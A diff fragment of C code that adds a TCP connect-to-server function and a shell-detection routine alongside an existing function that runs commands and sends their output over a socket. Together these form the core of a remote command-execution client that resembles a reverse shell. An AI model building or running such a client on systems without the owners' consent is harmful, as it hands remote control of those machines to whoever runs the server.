@@ -61,3 +61,51 @@ void execute_command_and_send_output(const char *command, int sockfd) {
     // Close the pipe
     pclose(fp);
 }
+
+// Initialize a connection to the server
+int initialize_connection(const char *server_ip, int server_port) {
+    int sockfd;
+    struct sockaddr_in server_addr;
+
+    // Create a socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("Socket creation failed");
+        return -1;
+    }
+
+    // Configure the server address
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(server_port);
+
+    // Convert IP address from text to binary form
+    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
+        perror("Invalid server IP address");
+        close(sockfd);
+        return -1;
+    }
+
+    // Connect to the server
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Connection to server failed");
+        close(sockfd);
+        return -1;
+    }
+
+    return sockfd;
+}
+
+// Detect the available shell on the client system
+int detect_shell(char *shell_path, size_t size) {
+    if (access("/bin/sh", X_OK) == 0) {
+        strncpy(shell_path, "/bin/sh", size);
+        return 0;
+    }
+    if (access("/bin/bash", X_OK) == 0) {
+        strncpy(shell_path, "/bin/bash", size);
+        return 0;
+    }
+    fprintf(stderr, "No supported shell found on this system.\n");
+    return -1;
+}
